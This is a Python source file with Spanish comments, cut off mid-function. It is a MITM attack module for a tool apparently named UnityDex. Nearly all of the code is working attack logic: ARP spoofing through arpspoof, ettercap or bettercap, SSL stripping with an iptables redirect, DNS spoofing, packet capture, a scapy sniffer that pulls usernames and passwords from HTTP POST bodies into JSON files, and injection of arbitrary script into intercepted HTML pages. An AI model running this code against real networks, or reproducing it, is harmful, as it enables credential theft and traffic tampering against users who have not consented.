#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Módulo de ataques Man-in-the-Middle (MITM) para UnityDex
Permite realizar ataques MITM con diversas técnicas y herramientas
'''

import os
import sys
import time
import json
import logging
import threading
import subprocess
import re
import socket
import platform
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Importar módulo de utilidades
try:
    from utils import (
        run_command, COLORS, create_dir_if_not_exists, generate_filename,
        save_json, load_json, check_command_availability, get_interface_info,
        is_interface_in_monitor_mode, set_interface_monitor_mode, check_root_privileges
    )
except ImportError:
    print("Error: No se pudo importar el módulo de utilidades")
    sys.exit(1)

# Intentar importar módulos adicionales
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Advertencia: Scapy no está instalado. Algunas funcionalidades estarán limitadas.")
    print("Instale scapy con: pip install scapy")

try:
    from scapy.layers import http
    HTTP_LAYER_AVAILABLE = True
except ImportError:
    HTTP_LAYER_AVAILABLE = False
    print("Advertencia: Capa HTTP de Scapy no disponible. La captura de credenciales HTTP estará limitada.")

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False
    print("Advertencia: Netifaces no está instalado. La detección de interfaces estará limitada.")
    print("Instale netifaces con: pip install netifaces")

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

logger = logging.getLogger('redtrigger.mitm_attack')

# Clase para ataques MITM
class MITMAttack:
    '''
    Clase para realizar ataques Man-in-the-Middle (MITM)
    
    Permite realizar ataques MITM utilizando diferentes técnicas y herramientas:
    - ARP Spoofing
    - DNS Spoofing
    - SSL Strip
    - Captura de paquetes
    - Captura de credenciales
    - Inyección de código
    - Detección automática de dispositivos
    '''
    def __init__(self, config=None):
        '''
        Inicializa el módulo de ataques MITM
        
        Args:
            config (dict): Configuración del ataque MITM
                - interface (str): Interfaz de red a utilizar
                - gateway_ip (str): IP del gateway
                - target_ip (str): IP del objetivo (opcional, si no se especifica se atacará toda la red)
                - output_dir (str): Directorio de salida para los resultados
                - verbose (bool): Modo verboso
                - ssl_strip (bool): Habilitar SSL Strip
                - dns_spoof (bool): Habilitar DNS Spoofing
                - dns_spoof_hosts (dict): Hosts para DNS Spoofing {dominio: ip}
                - packet_capture (bool): Habilitar captura de paquetes
                - capture_filter (str): Filtro para la captura de paquetes
                - capture_file (str): Archivo para guardar la captura
                - credential_capture (bool): Habilitar captura de credenciales
                - code_injection (bool): Habilitar inyección de código
                - injection_code (str): Código a inyectar
                - auto_detect (bool): Detección automática de dispositivos
        '''
        self.config = config or {}
        self.interface = self.config.get('interface', None)
        self.gateway_ip = self.config.get('gateway_ip', None)
        self.target_ip = self.config.get('target_ip', None)
        self.output_dir = self.config.get('output_dir', 'results')
        self.verbose = self.config.get('verbose', False)
        self.ssl_strip = self.config.get('ssl_strip', False)
        self.dns_spoof = self.config.get('dns_spoof', False)
        self.dns_spoof_hosts = self.config.get('dns_spoof_hosts', {})
        self.packet_capture = self.config.get('packet_capture', False)
        self.capture_filter = self.config.get('capture_filter', '')
        self.capture_file = self.config.get('capture_file', None)
        self.credential_capture = self.config.get('credential_capture', False)
        self.code_injection = self.config.get('code_injection', False)
        self.injection_code = self.config.get('injection_code', '<script>alert("XSS")</script>')
        self.auto_detect = self.config.get('auto_detect', False)
        
        # Nuevas funcionalidades de hacking ético
        self.https_inspection = self.config.get('https_inspection', False)
        self.script_injection_detection = self.config.get('script_injection_detection', False)
        self.api_fuzzing = self.config.get('api_fuzzing', False)
        self.session_hijacking_detection = self.config.get('session_hijacking_detection', False)
        self.mqtt_coap_scan = self.config.get('mqtt_coap_scan', False)
        self.default_credential_testing = self.config.get('default_credential_testing', False)
        self.firmware_analysis = self.config.get('firmware_analysis', False)
        self.container_security_scan = self.config.get('container_security_scan', False)
        self.cloud_misconfiguration_scan = self.config.get('cloud_misconfiguration_scan', False)
        self.vlan_hopping_test = self.config.get('vlan_hopping_test', False)
        self.compliance_report_type = self.config.get('compliance_report_type', None)  # OWASP, NIST, ISO27001
        self.attack_vector_visualization = self.config.get('attack_vector_visualization', False)
        self.auto_recommendations = self.config.get('auto_recommendations', False)
        
        # Inicializar variables de estado
        self.running = False
        self.processes = []
        self.attack_start_time = None
        self.attack_end_time = None
        self.captured_credentials = []
        self.detected_devices = []
        self.os_type = platform.system().lower()
        
        # Crear directorio de salida
        create_dir_if_not_exists(self.output_dir)
        
        # Verificar disponibilidad de herramientas
        self.ettercap_available = check_command_availability('ettercap')
        self.arpspoof_available = check_command_availability('arpspoof')
        self.dsniff_available = check_command_availability('dsniff')
        self.sslstrip_available = check_command_availability('sslstrip')
        self.tcpdump_available = check_command_availability('tcpdump')
        self.bettercap_available = check_command_availability('bettercap')
        self.netsh_available = self.os_type == 'windows'
        
        # Verificar privilegios de administrador
        self.admin_privileges = check_root_privileges()
        if not self.admin_privileges:
            logger.warning("No se tienen privilegios de administrador. Algunas funciones pueden no estar disponibles.")
            
        # Detectar gateway automáticamente si no se especifica
        if not self.gateway_ip and NETIFACES_AVAILABLE:
            self.gateway_ip = self._detect_default_gateway()
            if self.gateway_ip:
                logger.info(f"Gateway detectado automáticamente: {self.gateway_ip}")
            
        # Detectar interfaz automáticamente si no se especifica
        if not self.interface and NETIFACES_AVAILABLE:
            self.interface = self._detect_default_interface()
            if self.interface:
                logger.info(f"Interfaz detectada automáticamente: {self.interface}")
                
        # Inicializar sniffer para captura de credenciales
        self.credential_sniffer = None
        self.credential_sniffer_thread = None
    
    def _detect_default_gateway(self):
        '''
        Detecta automáticamente el gateway predeterminado
        
        Returns:
            str: IP del gateway predeterminado o None si no se pudo detectar
        '''
        try:
            if NETIFACES_AVAILABLE:
                gateways = netifaces.gateways()
                if netifaces.AF_INET in gateways['default']:
                    return gateways['default'][netifaces.AF_INET][0]
            
            # Alternativa si netifaces no está disponible
            if self.os_type == 'linux':
                output = run_command('ip route | grep default')
                match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', output)
                if match:
                    return match.group(1)
            elif self.os_type == 'windows':
                output = run_command('ipconfig | findstr /i "Default Gateway"')
                match = re.search(r'Default Gateway[^\d]+(\d+\.\d+\.\d+\.\d+)', output)
                if match:
                    return match.group(1)
            
            return None
        except Exception as e:
            logger.error(f"Error al detectar gateway predeterminado: {str(e)}")
            return None
    
    def _detect_default_interface(self):
        '''
        Detecta automáticamente la interfaz de red predeterminada
        
        Returns:
            str: Nombre de la interfaz predeterminada o None si no se pudo detectar
        '''
        try:
            if NETIFACES_AVAILABLE:
                gateways = netifaces.gateways()
                if netifaces.AF_INET in gateways['default']:
                    return gateways['default'][netifaces.AF_INET][1]
            
            # Alternativa si netifaces no está disponible
            if self.os_type == 'linux':
                output = run_command('ip route | grep default')
                match = re.search(r'dev (\w+)', output)
                if match:
                    return match.group(1)
            elif self.os_type == 'windows':
                # En Windows es más complejo, intentamos obtener la interfaz con IP asignada
                output = run_command('ipconfig /all')
                interfaces = re.findall(r'Ethernet adapter ([^:]+):[\s\S]+?IPv4 Address[^\d]+(\d+\.\d+\.\d+\.\d+)', output)
                if interfaces:
                    return interfaces[0][0]
            
            return None
        except Exception as e:
            logger.error(f"Error al detectar interfaz predeterminada: {str(e)}")
            return None
    
    def _scan_network(self):
        '''
        Escanea la red para detectar dispositivos
        
        Returns:
            list: Lista de dispositivos detectados
        '''
        devices = []
        
        try:
            if not self.gateway_ip:
                logger.error("No se ha especificado la IP del gateway")
                return devices
            
            # Determinar el rango de red
            network = '.'.join(self.gateway_ip.split('.')[:3]) + '.0/24'
            logger.info(f"Escaneando red {network}...")
            
            if SCAPY_AVAILABLE:
                # Usar Scapy para escanear la red
                arp_request = scapy.ARP(pdst=network)
                broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast/arp_request
                answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
                
                # Si está habilitado el escaneo de IoT, realizar análisis adicional
                if self.mqtt_coap_scan:
                    logger.info("Realizando escaneo de dispositivos IoT (MQTT/CoAP)...")
                    self._scan_iot_protocols(network)
                
                for sent, received in answered_list:
                    # Intentar obtener el hostname
                    hostname = ""
                    try:
                        hostname = socket.gethostbyaddr(received.psrc)[0]
                    except:
                        pass
                    
                    device = {
                        'ip': received.psrc,
                        'mac': received.hwsrc,
                        'hostname': hostname
                    }
                    devices.append(device)
            else:
                # Alternativa si Scapy no está disponible
                if self.os_type == 'linux':
                    # Usar nmap para escanear la red
                    if check_command_availability('nmap'):
                        output = run_command(f"nmap -sn {network}")
                        ip_list = re.findall(r'Nmap scan report for ([^\s]+) \((\d+\.\d+\.\d+\.\d+)\)', output)
                        mac_list = re.findall(r'MAC Address: ([0-9A-F:]+) \(([^\)]+)\)', output)
                        
                        # Combinar resultados
                        for i, (hostname, ip) in enumerate(ip_list):
                            mac = mac_list[i][0] if i < len(mac_list) else ""
                            vendor = mac_list[i][1] if i < len(mac_list) else ""
                            
                            device = {
                                'ip': ip,
                                'mac': mac,
                                'hostname': hostname if hostname != ip else "",
                                'vendor': vendor
                            }
                            devices.append(device)
                elif self.os_type == 'windows':
                    # Usar ARP para escanear la red en Windows
                    output = run_command("arp -a")
                    arp_entries = re.findall(r'(\d+\.\d+\.\d+\.\d+)[^\d]+(\S+)[^\d]+\w+', output)
                    
                    for ip, mac in arp_entries:
                        # Intentar obtener el hostname
                        hostname = ""
                        try:
                            hostname = socket.gethostbyaddr(ip)[0]
                        except:
                            pass
                        
                        device = {
                            'ip': ip,
                            'mac': mac,
                            'hostname': hostname
                        }
                        devices.append(device)
                
                # Si está habilitado el escaneo de IoT, realizar análisis adicional
                if self.mqtt_coap_scan:
                    logger.info("Realizando escaneo de dispositivos IoT (MQTT/CoAP)...")
                    self._scan_iot_protocols(network)
            
            logger.info(f"Se encontraron {len(devices)} dispositivos en la red")
            return devices
        
        except Exception as e:
            logger.error(f"Error al escanear la red: {str(e)}")
            return devices
    
    def _check_requirements(self):
        '''
        Verifica los requisitos para realizar ataques MITM
        
        Returns:
            bool: True si se cumplen los requisitos, False en caso contrario
        '''
        # Verificar privilegios de administrador
        if not self.admin_privileges:
            logger.error("Se requieren privilegios de administrador para realizar ataques MITM")
            return False
        
        # Verificar interfaz
        if not self.interface:
            if self.auto_detect and NETIFACES_AVAILABLE:
                self.interface = self._detect_default_interface()
                if self.interface:
                    logger.info(f"Interfaz detectada automáticamente: {self.interface}")
                else:
                    logger.error("No se pudo detectar automáticamente una interfaz")
                    return False
            else:
                logger.error("No se ha especificado una interfaz")
                return False
        
        # Verificar si la interfaz existe
        interfaces = get_interface_info()
        if self.interface not in interfaces:
            logger.error(f"La interfaz {self.interface} no existe")
            return False
        
        # Verificar gateway IP
        if not self.gateway_ip:
            logger.error("No se ha especificado la IP del gateway")
            return False
        
        # Verificar disponibilidad de herramientas
        if not (self.ettercap_available or self.arpspoof_available or self.bettercap_available):
            logger.error("No se encontraron herramientas para realizar ataques MITM")
            return False
        
        # Verificar SSL Strip
        if self.ssl_strip and not self.sslstrip_available:
            logger.warning("sslstrip no está disponible. SSL Strip no estará disponible.")
            self.ssl_strip = False
        
        # Verificar captura de paquetes
        if self.packet_capture and not self.tcpdump_available:
            logger.warning("tcpdump no está disponible. La captura de paquetes no estará disponible.")
            self.packet_capture = False
        
        # Verificar DNS Spoofing
        if self.dns_spoof and not self.dsniff_available:
            logger.warning("dsniff no está disponible. DNS Spoofing no estará disponible.")
            self.dns_spoof = False
        
        # Verificar DNS Spoofing hosts
        if self.dns_spoof and not self.dns_spoof_hosts:
            logger.warning("No se han especificado hosts para DNS Spoofing")
            self.dns_spoof = False
        
        return True
    
    def _enable_ip_forwarding(self):
        '''
        Habilita el reenvío de IP
        
        Returns:
            bool: True si se habilitó correctamente, False en caso contrario
        '''
        try:
            if self.os_type == 'linux':
                # Linux
                run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
                logger.info("Reenvío de IP habilitado en Linux")
                return True
            elif self.os_type == 'windows':
                # Windows
                run_command('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f')
                # Reiniciar servicio de enrutamiento
                run_command('net stop RemoteAccess && net start RemoteAccess')
                logger.info("Reenvío de IP habilitado en Windows")
                return True
            else:
                logger.error(f"Sistema operativo {self.os_type} no soportado para reenvío de IP")
                return False
        except Exception as e:
            logger.error(f"Error al habilitar reenvío de IP: {str(e)}")
            return False
    
    def _disable_ip_forwarding(self):
        '''
        Deshabilita el reenvío de IP
        
        Returns:
            bool: True si se deshabilitó correctamente, False en caso contrario
        '''
        try:
            if self.os_type == 'linux':
                # Linux
                run_command('echo 0 > /proc/sys/net/ipv4/ip_forward')
                logger.info("Reenvío de IP deshabilitado en Linux")
                return True
            elif self.os_type == 'windows':
                # Windows
                run_command('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 0 /f')
                # Reiniciar servicio de enrutamiento
                run_command('net stop RemoteAccess && net start RemoteAccess')
                logger.info("Reenvío de IP deshabilitado en Windows")
                return True
            else:
                logger.error(f"Sistema operativo {self.os_type} no soportado para reenvío de IP")
                return False
        except Exception as e:
            logger.error(f"Error al deshabilitar reenvío de IP: {str(e)}")
            return False
            
    def _packet_callback(self, packet):
        '''
        Callback para procesar paquetes capturados
        
        Args:
            packet: Paquete capturado
            
        Returns:
            None
        '''
        if not SCAPY_AVAILABLE or not HTTP_LAYER_AVAILABLE:
            return
            
        try:
            # Capturar credenciales HTTP
            if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                logger.debug(f"[+] URL visitada: {url}")
                
                # Buscar credenciales en formularios POST
                if packet.haslayer(scapy.Raw) and packet[http.HTTPRequest].Method == b'POST':
                    load = packet[scapy.Raw].load.decode(errors='ignore')
                    fields = ['username', 'user', 'login', 'email', 'password', 'pass', 'pwd']
                    
                    for field in fields:
                        if field in load.lower():
                            logger.info(f"[!] Posibles credenciales capturadas: {url}")
                            logger.info(f"[!] Datos: {load}")
                            
                            # Guardar credenciales capturadas
                            credential = {
                                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                'source_ip': packet[scapy.IP].src,
                                'destination_ip': packet[scapy.IP].dst,
                                'url': url,
                                'data': load
                            }
                            
                            self.captured_credentials.append(credential)
                            
                            # Guardar en archivo
                            self._save_credentials()
                            break
        except Exception as e:
            logger.error(f"Error al procesar paquete: {str(e)}")
            
    def _save_credentials(self):
        '''
        Guarda las credenciales capturadas en un archivo JSON
        
        Returns:
            None
        '''
        try:
            if not self.captured_credentials:
                return
                
            # Crear directorio de salida si no existe
            create_dir_if_not_exists(self.output_dir)
            
            # Generar nombre de archivo
            filename = os.path.join(self.output_dir, f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            
            # Guardar credenciales
            save_json(filename, self.captured_credentials)
            logger.info(f"Credenciales guardadas en {filename}")
        except Exception as e:
            logger.error(f"Error al guardar credenciales: {str(e)}")
            
    def _start_credential_sniffer(self):
        '''
        Inicia el sniffer para captura de credenciales
        
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        '''
        if not SCAPY_AVAILABLE or not HTTP_LAYER_AVAILABLE:
            logger.error("Scapy o la capa HTTP no están disponibles. No se puede iniciar el sniffer de credenciales.")
            return False
            
        try:
            logger.info("Iniciando sniffer de credenciales...")
            
            # Iniciar sniffer en un hilo separado
            self.credential_sniffer_thread = threading.Thread(
                target=self._run_credential_sniffer,
                daemon=True
            )
            self.credential_sniffer_thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Error al iniciar sniffer de credenciales: {str(e)}")
            return False
            
    def _run_credential_sniffer(self):
        '''
        Ejecuta el sniffer para captura de credenciales
        
        Returns:
            None
        '''
        try:
            # Filtro para capturar tráfico HTTP
            filter_str = "tcp port 80"
            
            # Iniciar sniffer
            scapy.sniff(
                iface=self.interface,
                store=False,
                prn=self._packet_callback,
                filter=filter_str,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            logger.error(f"Error en el sniffer de credenciales: {str(e)}")
            
    def _setup_windows_mitm(self):
        '''
        Configura el entorno para ataques MITM en Windows
        
        Returns:
            bool: True si se configuró correctamente, False en caso contrario
        '''
        try:
            if self.os_type != 'windows':
                return True
                
            logger.info("Configurando entorno para MITM en Windows...")
            
            # Habilitar reenvío de IP
            self._enable_ip_forwarding()
            
            # Configurar reglas de firewall para permitir el tráfico
            run_command('netsh advfirewall firewall add rule name="MITM Forwarding" dir=in action=allow protocol=TCP localport=any')
            run_command('netsh advfirewall firewall add rule name="MITM Forwarding" dir=in action=allow protocol=UDP localport=any')
            
            return True
        except Exception as e:
            logger.error(f"Error al configurar entorno para MITM en Windows: {str(e)}")
            return False
            
    def _cleanup_windows_mitm(self):
        '''
        Limpia la configuración de MITM en Windows
        
        Returns:
            bool: True si se limpió correctamente, False en caso contrario
        '''
        try:
            if self.os_type != 'windows':
                return True
                
            logger.info("Limpiando configuración de MITM en Windows...")
            
            # Deshabilitar reenvío de IP
            self._disable_ip_forwarding()
            
            # Eliminar reglas de firewall
            run_command('netsh advfirewall firewall delete rule name="MITM Forwarding"')
            
            return True
        except Exception as e:
            logger.error(f"Error al limpiar configuración de MITM en Windows: {str(e)}")
            return False
    
    def _start_arpspoof(self):
        '''
        Inicia ARP Spoofing con arpspoof
        '''
        if not self.arpspoof_available:
            logger.error("arpspoof no está disponible")
            return False
        
        try:
            # Iniciar ARP Spoofing hacia el objetivo
            if self.target_ip:
                cmd1 = f"arpspoof -i {self.interface} -t {self.target_ip} {self.gateway_ip}"
                process1 = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.processes.append(process1)
                
                # Iniciar ARP Spoofing hacia el gateway
                cmd2 = f"arpspoof -i {self.interface} -t {self.gateway_ip} {self.target_ip}"
                process2 = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.processes.append(process2)
            else:
                # Iniciar ARP Spoofing hacia toda la red
                cmd = f"arpspoof -i {self.interface} {self.gateway_ip}"
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.processes.append(process)
            
            logger.info("ARP Spoofing iniciado")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar ARP Spoofing: {str(e)}")
            return False
    
    def _start_ettercap(self):
        '''
        Inicia ARP Spoofing con ettercap
        '''
        if not self.ettercap_available:
            logger.error("ettercap no está disponible")
            return False
        
        try:
            # Construir comando
            cmd = f"ettercap -T -q -i {self.interface} -M arp"
            
            if self.target_ip and self.gateway_ip:
                cmd += f" /{self.target_ip}// /{self.gateway_ip}//"
            else:
                cmd += " //"
            
            # Iniciar ettercap
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            logger.info("Ettercap iniciado")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar Ettercap: {str(e)}")
            return False
    
    def _start_bettercap(self):
        '''
        Inicia ARP Spoofing con bettercap
        '''
        if not self.bettercap_available:
            logger.error("bettercap no está disponible")
            return False
        
        try:
            # Crear archivo de configuración temporal
            config_file = os.path.join(self.output_dir, 'bettercap.cap')
            with open(config_file, 'w') as f:
                f.write("set arp.spoof.targets " + (self.target_ip or "") + "\n")
                f.write("set arp.spoof.internal true\n")
                f.write("set arp.spoof.fullduplex true\n")
                f.write("arp.spoof on\n")
                
                if self.packet_capture:
                    f.write("set net.sniff.output " + (self.capture_file or os.path.join(self.output_dir, 'bettercap.pcap')) + "\n")
                    f.write("set net.sniff.filter " + (self.capture_filter or "") + "\n")
                    f.write("net.sniff on\n")
                
                if self.dns_spoof and self.dns_spoof_hosts:
                    f.write("set dns.spoof.domains " + ",".join(self.dns_spoof_hosts.keys()) + "\n")
                    for domain, ip in self.dns_spoof_hosts.items():
                        f.write(f"set dns.spoof.address {ip}\n")
                    f.write("dns.spoof on\n")
            
            # Iniciar bettercap
            cmd = f"bettercap -iface {self.interface} -caplet {config_file}"
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            logger.info("Bettercap iniciado")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar Bettercap: {str(e)}")
            return False
    
    def _start_sslstrip(self):
        '''
        Inicia SSL Strip
        '''
        if not self.sslstrip_available:
            logger.error("sslstrip no está disponible")
            return False
        
        try:
            # Crear directorio de salida si no existe
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)
            
            # Iniciar sslstrip
            log_file = os.path.join(self.output_dir, 'sslstrip.log')
            cmd = f"sslstrip -a -k -f -w {log_file}"
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            # Configurar iptables para redirigir tráfico HTTP
            run_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
            
            logger.info("SSL Strip iniciado")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar SSL Strip: {str(e)}")
            return False
    
    def _start_dnsspoof(self):
        '''
        Inicia DNS Spoofing
        '''
        if not self.dsniff_available:
            logger.error("dsniff no está disponible")
            return False
        
        if not self.dns_spoof_hosts:
            logger.error("No se han especificado hosts para DNS Spoofing")
            return False
        
        try:
            # Crear archivo de hosts
            hosts_file = os.path.join(self.output_dir, 'hosts.txt')
            with open(hosts_file, 'w') as f:
                for domain, ip in self.dns_spoof_hosts.items():
                    f.write(f"{ip} {domain}\n")
            
            # Iniciar dnsspoof
            cmd = f"dnsspoof -i {self.interface} -f {hosts_file}"
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            logger.info("DNS Spoofing iniciado")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar DNS Spoofing: {str(e)}")
            return False
    
    def _start_tcpdump(self):
        '''
        Inicia captura de paquetes con tcpdump
        
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        '''
        if not self.tcpdump_available:
            logger.error("tcpdump no está disponible")
            return False
        
        try:
            # Crear directorio de salida si no existe
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)
            
            # Generar nombre de archivo
            if not self.capture_file:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                self.capture_file = os.path.join(self.output_dir, f"mitm_capture_{timestamp}.pcap")
            
            # Construir comando
            cmd = f"tcpdump -i {self.interface} -w {self.capture_file}"
            
            if self.capture_filter:
                cmd += f" '{self.capture_filter}'"
            
            # Iniciar tcpdump
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            logger.info(f"Captura de paquetes iniciada: {self.capture_file}")
            return True
        except Exception as e:
            logger.error(f"Error al iniciar captura de paquetes: {str(e)}")
            return False
            
    def _start_code_injection(self):
        '''
        Inicia la inyección de código en el tráfico HTTP
        
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        '''
        if not SCAPY_AVAILABLE or not HTTP_LAYER_AVAILABLE:
            logger.error("Scapy o la capa HTTP no están disponibles. No se puede iniciar la inyección de código.")
            return False
            
        if not self.injection_code:
            logger.error("No se ha especificado código para inyectar")
            return False
            
        try:
            logger.info("Iniciando inyección de código...")
            
            # Guardar el código de inyección en un archivo
            injection_file = os.path.join(self.output_dir, 'injection_code.js')
            with open(injection_file, 'w') as f:
                f.write(self.injection_code)
            
            # Iniciar proxy de inyección en un hilo separado
            self.injection_thread = threading.Thread(
                target=self._run_code_injection,
                daemon=True
            )
            self.injection_thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Error al iniciar inyección de código: {str(e)}")
            return False
            
    def _run_code_injection(self):
        '''
        Ejecuta la inyección de código en el tráfico HTTP
        
        Returns:
            None
        '''
        try:
            from scapy.all import sniff, IP, TCP, send
            
            def modify_packet(packet):
                if packet.haslayer(http.HTTPResponse) and packet.haslayer(scapy.Raw):
                    # Verificar si es una respuesta HTML
                    if b'text/html' in packet[http.HTTPResponse].fields.get('Content-Type', b''):
                        # Obtener el contenido original
                        html = packet[scapy.Raw].load.decode(errors='ignore')
                        
                        # Inyectar código antes del cierre del body
                        if '</body>' in html:
                            modified_html = html.replace('</body>', f'<script>{self.injection_code}</script></body>')
                            
                            # Actualizar el paquete con el contenido modificado
                            packet[scapy.Raw].load = modified_html.encode()
                            
                            # Actualizar longitud del contenido
                            if b'Content-Length' in packet[http.HTTPResponse].fields:
                                packet[http.HTTPResponse].fields[b'Content-Length'] = str(len(modified_html)).encode()
                            
                            # Recalcular checksums
                            del packet[IP].chksum
                            del packet[TCP].chksum
                            
                            # Enviar paquete modificado
                            send(packet, verbose=0)
                            logger.debug("Código inyectado en respuesta HTTP")
                            
                            # No permitir que el paquete original continúe
                            return None
                return packet
            
            # Iniciar sniffer para interceptar y modificar paquetes HTTP
            sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=modify_packet,
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            logger.error(f"Error en la inyección de código: {str(e)}")
    
    def start_attack(self, attack_type='arpspoof'):
        '''
        Inicia un ataque MITM
        
        Args:
            attack_type (str): Tipo de ataque (arpspoof, ettercap, bettercap)
            
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        '''
        # Verificar requisitos
        if not self._check_requirements():
            return False
        
        # Verificar si ya hay un ataque en curso
        if self.running:
            logger.warning("Ya hay un ataque en curso")
            return False
            
        # Configurar nuevas funcionalidades de hacking ético
        if self.https_inspection:
            if not self._setup_https_inspection():
                logger.warning("No se pudo configurar la inspección HTTPS")
            
        if self.script_injection_detection:
            if not self._setup_script_injection_detection():
                logger.warning("No se pudo configurar la detección de inyección de scripts")
            
        if self.api_fuzzing:
            if not self._setup_api_fuzzing():
                logger.warning("No se pudo configurar el fuzzing de APIs")
            
        if self.session_hijacking_detection:
            if not self._setup_session_hijacking_detection():
                logger.warning("No se pudo configurar la detección de secuestro de sesión")
            
        if self.container_security_scan:
            if not self._setup_container_security_scan():
                logger.warning("No se pudo configurar el escaneo de seguridad de contenedores")
            
        if self.cloud_misconfiguration_scan:
            if not self._setup_cloud_misconfiguration_scan():
                logger.warning("No se pudo configurar el escaneo de configuraciones incorrectas en la nube")
            
        if self.vlan_hopping_test:
            if not self._setup_vlan_hopping_test():
                logger.warning("No se pudo configurar la prueba de VLAN hopping")
        
        # Crear directorio de salida si no existe
        if self.output_dir and not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                logger.error(f"Error al crear directorio de salida: {str(e)}")
                return False
        
        # Configurar entorno específico para Windows si es necesario
        if self.os_type == 'windows':
            if not self._setup_windows_mitm():
                logger.warning("No se pudo configurar el entorno para MITM en Windows")
        else:
            # Habilitar reenvío de IP en Linux
            if not self._enable_ip_forwarding():
                logger.warning("No se pudo habilitar el reenvío de IP")
        
        # Iniciar ataque
        success = False
        self.attack_start_time = time.time()
        
        # Iniciar captura de credenciales si está habilitada
        if self.credential_capture and SCAPY_AVAILABLE and HTTP_LAYER_AVAILABLE:
            if not self._start_credential_sniffer():
                logger.warning("No se pudo iniciar la captura de credenciales")
        
        # Iniciar el ataque principal según el tipo seleccionado
        if attack_type == 'arpspoof':
            success = self._start_arpspoof()
        elif attack_type == 'ettercap':
            success = self._start_ettercap()
        elif attack_type == 'bettercap':
            success = self._start_bettercap()
        else:
            logger.error(f"Tipo de ataque no soportado: {attack_type}")
            return False
        
        if not success:
            logger.error(f"Error al iniciar ataque {attack_type}")
            return False
        
        # Iniciar SSL Strip si está habilitado
        if self.ssl_strip and attack_type != 'bettercap':
            if not self._start_sslstrip():
                logger.warning("No se pudo iniciar SSL Strip")
        
        # Iniciar DNS Spoofing si está habilitado
        if self.dns_spoof and attack_type != 'bettercap':
            if not self._start_dnsspoof():
                logger.warning("No se pudo iniciar DNS Spoofing")
        
        # Iniciar captura de paquetes si está habilitada
        if self.packet_capture and attack_type != 'bettercap':
            if not self._start_tcpdump():
                logger.warning("No se pudo iniciar la captura de paquetes")
        
        # Iniciar inyección de código si está habilitada
        if self.code_injection and self.injection_code:
            if not self._start_code_injection():
                logger.warning("No se pudo iniciar la inyección de código")
        
        self.running = True
        logger.info(f"Ataque MITM iniciado con {attack_type}")
        
        return True
    
    def stop_attack(self):
        '''
        Detiene el ataque MITM
        
        Returns:
            bool: True si se detuvo correctamente, False en caso contrario
        '''
        if not self.running:
            logger.warning("No hay ningún ataque en curso")
            return False
        
        # Detener procesos
        for process in self.processes:
            try:
                process.terminate()
            except Exception as e:
                logger.debug(f"Error al terminar proceso: {str(e)}")
        
        self.processes = []
        
        # Detener sniffer de credenciales
        self.running = False  # Esto detendrá el sniffer de credenciales
        
        # Limpiar configuración específica de Windows
        if self.os_type == 'windows':
            self._cleanup_windows_mitm()
        else:
            # Deshabilitar reenvío de IP en Linux
            self._disable_ip_forwarding()
            
            # Limpiar reglas de iptables si se usó SSL Strip
            if self.ssl_strip:
                try:
                    run_command('iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
                except Exception as e:
                    logger.debug(f"Error al limpiar reglas de iptables: {str(e)}")
        
        self.attack_end_time = time.time()
        
        # Guardar resultados finales
        if self.output_dir:
            try:
                results = self.get_results()
